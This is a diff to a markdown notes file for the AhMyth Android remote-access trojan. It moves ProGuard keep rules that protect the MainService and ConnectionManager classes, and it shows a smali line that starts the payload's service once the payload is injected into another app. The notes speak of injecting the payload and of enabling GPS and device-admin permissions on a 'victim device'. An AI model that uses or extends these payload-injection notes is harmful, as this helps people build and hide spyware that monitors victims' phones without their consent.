@@ -12,6 +12,32 @@ the files the coding for this new function were taken from in the **androidpaylo
 ```smali
 invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V
 ```
+- Progaurd-rules.pro
+```pro
+
+-keep public class * extends android.app.Activity
+
+-keep public class * extends android.app.Service
+
+-keep public class * extends android.content.MyReceiver
+
+-keep class ahmyth.mine.king.ahmyth.MainService {
+
+    public static <methods>;
+
+}
+
+-keep class ahmyth.mine.king.ahmyth.ConnectionManager {
+
+    public static <methods>;
+
+}
+
+-optimizationpasses 5
+
+-verbose
+
+```
 - Service Start for MainActivity.java File
 ```java
 MainService.startService(this);
@@ -303,28 +329,4 @@ This will hopefully allow automatic enabling of the victim device's GPS, Device 
                 Manifest.permission.BIND_DEVICE_ADMIN,
 
         });
-```
-# Hopeful Progaurd config to aid in injection
-```cfg
--keep public class * extends android.app.Activity
-
--keep public class * extends android.app.Service
-
--keep public class * extends android.content.MyReceiver
-
--keep class ahmyth.mine.king.ahmyth.MainService {
-
-    public static <methods>;
-
-}
-
--keep class ahmyth.mine.king.ahmyth.ConnectionManager {
-
-    public static <methods>;
-
-}
-
--optimizationpasses 5
-
--verbose
 ```
